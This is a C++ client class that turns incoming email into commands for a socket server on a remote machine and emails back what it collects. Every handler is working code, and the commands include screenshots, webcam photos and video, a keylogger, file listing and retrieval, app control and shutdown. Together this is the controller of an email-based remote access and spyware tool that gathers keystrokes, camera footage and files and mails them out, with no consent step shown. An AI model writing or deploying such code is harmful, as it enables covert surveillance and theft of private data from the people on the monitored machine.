#include <thread>
#include <chrono>
#include <cstring>
#include "./socket_client.h"
#include "./mail.h"
#include "./utils.h"

class Client {
private:
    int client_socket;
    string from_email, to_email;
    struct sockaddr_in serv_addr;
    char buffer[BUFFER_SIZE];

    void handle_command(json& command) {
        if (command["status"] == "success") {
            cout << "New email found!" << endl;
            string message;

            // Handle message for specific cases
            vector<string> specialCommands = {"listas", "startas", "stopas", "webcam", "webcamitv", "webcamvideo", "shutdown", "restart", "sleep"};
            if (find(specialCommands.begin(), specialCommands.end(), command["subject"]) != specialCommands.end()) {
                json params = convert_body_to_json(command["body"]);
                json request = {
                    {"cmd", command["subject"]},
                    {"params", params}
                };
                message = request.dump();
            } else {
                message = command.dump();
            }

            send(client_socket, message.c_str(), message.size(), 0);

            // Receive server's response
            memset(buffer, 0, BUFFER_SIZE);
            cout << "Reading server's response..." << endl;
            int bytes_received = recv(client_socket, buffer, BUFFER_SIZE, 0);
            if (bytes_received < 0) {
                cerr << "Receive failed" << endl;
                return;
            }

            cout << "Response: " << buffer << endl;
            json response = json::parse(buffer);
            string cmd = response["cmd"];

            // Process the server's response
            if (cmd == "screenshot") {
                handle_screenshot(response);
            } else if (cmd == "screenshotitv") {
                handle_screenshot_thread(response);
            } else if (cmd == "createff" || cmd == "moveff" || cmd == "copyff" || cmd == "deleteff" 
            || cmd == "saveff" || cmd == "startas" || cmd == "stopas" || cmd == "shutdown" || cmd == "restart" 
            || cmd == "sleep") {
                handle_operations(cmd, response);
            } else if (cmd == "listff") {
                handle_list_files(response);
            } else if (cmd == "getff") {
                handle_get_files(response);
            } else if (cmd == "listas") {
                handle_list_apps(response);
            } else if (cmd == "webcam") {
                handle_webcam(response);
            } else if (cmd == "webcamitv") {
                handle_webcam_thread(response);
            } else if (cmd == "webcamvideo") {
                handle_webcam_video_thread(response);
            } else if (cmd == "keyloggeritv") {
                handle_keylogger_thread(response);
            }
        } else {
            cout << "No new email found!" << endl;
        }
    }

    void handle_screenshot(json& response) {
        string file_name = response["body"]["filename"];
        string file_path = "./response/screenshot/" + file_name;
        int file_size = response["body"]["bytes"];

        receive_file(file_path, file_size, client_socket);

        cout << "Screenshot saved successfully!" << endl;
        response["body"]["status"] = "success";
        send_mail(from_email, to_email, "screenshot", response, "png", file_path);
    }

    void handle_webcam(json& response) {
        string file_name = response["body"]["filename"];
        string file_path = "./response/webcam/" + file_name;
        int file_size = response["body"]["bytes"];

        receive_file(file_path, file_size, client_socket);

        cout << "Webcam saved successfully!" << endl;
        response["body"]["status"] = "success";
        send_mail(from_email, to_email, "webcam", response, "zip", file_path);
    }

    void handle_screenshot_thread(json& response) {
        string status = response["body"]["status"];
        string file_name = response["body"]["filename"];

        if (status == "started") {
            cout << "Screenshot thread started!" << endl;
        } else if (status == "stopped") {
            cout << "Screenshot thread stopped!" << endl;

            string file_path = "./response/screenshots/" + file_name;
            int file_size = response["body"]["bytes"];

            receive_file(file_path, file_size, client_socket);

            cout << "Screenshots saved successfully!" << endl;
            response["body"]["status"] = "success";
            send_mail(from_email, to_email, "screenshotitv", response, "zip", file_path);
        }
    }

    void handle_webcam_thread(json& response) {
        string status = response["body"]["status"];

        if (status == "started") {
            cout << "Webcam thread started!" << endl;
        } else if (status == "stopped") {
            cout << "Webcam thread stopped!" << endl;

            string file_name = response["body"]["filename"];
            string file_path = "./response/webcam/" + file_name;
            int file_size = response["body"]["bytes"];

            receive_file(file_path, file_size, client_socket);

            cout << "Webcam saved successfully!" << endl;
            response["body"]["status"] = "success";
            send_mail(from_email, to_email, "webcamitv", response, "zip", file_path);
        }
    }

    void handle_webcam_video_thread(json& response) {
        string status = response["body"]["status"];

        if (status == "started") {
            cout << "Webcam video thread started!" << endl;
        } else if (status == "stopped") {
            cout << "Webcam video thread stopped!" << endl;

            string file_name = response["body"]["filename"];
            string file_path = "./response/webcam/" + file_name;
            int file_size = response["body"]["bytes"];

            receive_file(file_path, file_size, client_socket);

            cout << "Webcam video saved successfully!" << endl;
            response["body"]["status"] = "success";
            send_mail(from_email, to_email, "webcamvideo", response, "zip", file_path);
        }
    }

    void handle_keylogger_thread(json& response) {
        string status = response["body"]["status"];

        if (status == "started") {
            cout << "Keylogger thread started!" << endl;
        } else if (status == "stopped") {
            cout << "Keylogger thread stopped!" << endl;
            
            string file_name = response["body"]["filename"];
            string file_path = "./response/keylogs/" + file_name;
            int file_size = response["body"]["bytes"];

            receive_file(file_path, file_size, client_socket);

            cout << "Keyloggs saved successfully!" << endl;
            response["body"]["status"] = "success";
            send_mail(from_email, to_email, "keyloggeritv", response, "zip", file_path);
        }
    }

    void handle_operations(const string& cmd, json& response) {
        string status = response["body"]["status"];
        if (status == "success") {
            cout << cmd << " operation successful!" << endl;
        } else {
            cout << cmd << " operation failed!" << endl;
        }
        send_mail(from_email, to_email, cmd, response, "", "");
    }

    void handle_list_files(json& response) {
        string file_name = response["body"]["filename"];
        string file_path = "./response/contents_list/" + file_name;
        int file_size = response["body"]["bytes"];

        receive_file(file_path, file_size, client_socket);

        cout << "File list saved successfully!" << endl;
        response["body"]["status"] = "success";
        send_mail(from_email, to_email, "listff", response, "csv", file_path);
    }

    void handle_get_files(json& response) {
        string file_name = response["body"]["filename"];
        string file_path = "./response/server_files/" + file_name.substr(0, file_name.find_last_of('.')) + ".zip";
        int file_size = response["body"]["bytes"];

        receive_file(file_path, file_size, client_socket);

        cout << "File received successfully!" << endl;
        response["body"]["status"] = "success";
        send_mail(from_email, to_email, "getff", response, "zip", file_path);
    }

    void handle_list_apps(json& response) {
        string file_name = response["body"]["filename"];
        string file_path = "./response/contents_list/" + file_name;
        int file_size = response["body"]["bytes"];

        receive_file(file_path, file_size, client_socket);

        cout << "App/Service list saved successfully!" << endl;
        response["body"]["status"] = "success";
        send_mail(from_email, to_email, "listas", response, "csv", file_path);
    }

public:
    Client(const string& ip_address, int port, const string& from_email, const string& to_email) {
        this->from_email = from_email;
        this->to_email = to_email;
        client_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (client_socket < 0) {
            throw runtime_error("Socket creation error");
        }

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(port);
        serv_addr.sin_addr.s_addr = inet_addr(ip_address.c_str());
    }

    ~Client() {
        close(client_socket);
    }

    void connect_to_server() {
        if (connect(client_socket, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
            throw runtime_error("Connection failed 1");
        }
        cout << "Connected to the server!" << endl;
    }

    void run() {
        update_token();

        while (true) {
            json command = generate_command(to_email);
            handle_command(command);

            this_thread::sleep_for(chrono::seconds(5));
        }
    }
};